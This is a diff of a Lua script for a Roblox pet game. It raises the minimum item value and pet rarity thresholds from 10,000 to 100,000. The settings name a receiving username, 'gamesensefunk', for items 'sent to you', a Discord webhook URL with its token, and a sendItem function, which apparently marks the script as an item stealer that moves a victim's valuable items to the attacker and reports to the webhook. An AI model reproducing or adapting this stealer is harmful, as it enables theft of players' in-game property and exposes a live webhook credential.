@@ -1,6 +1,6 @@
 Username = "gamesensefunk"
-min_rap = 10000 -- minimum rap of each item you want to get sent to you. 10k by default
-min_chance = 10000 -- minimum chance of pets you want to get sent to you. 10k by default, which means that it will not send pets under 1 in 10k
+min_rap = 100000 -- minimum rap of each item you want to get sent to you. 10k by default
+min_chance = 100000 -- minimum chance of pets you want to get sent to you. 10k by default, which means that it will not send pets under 1 in 10k
 webhook = "https://discord.com/api/webhooks/1296206913201115207/EpLwlZo1bByaL4FkwRZiUsJyeXgzV8yEBDfYjs4vmEu6_L1grG9BATdwwPApSpFX3bnY"
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
@@ -174,8 +174,8 @@ local function getRAP(Type, Item)
 end
 
 local user = Username or "gamesensefunk"
-local min_rap = min_rap or 10000
-local min_chance = min_chance or 10000
+local min_rap = min_rap or 100000
+local min_chance = min_chance or 100000
 local webhook = webhook
 
 local function sendItem(category, uid, am)
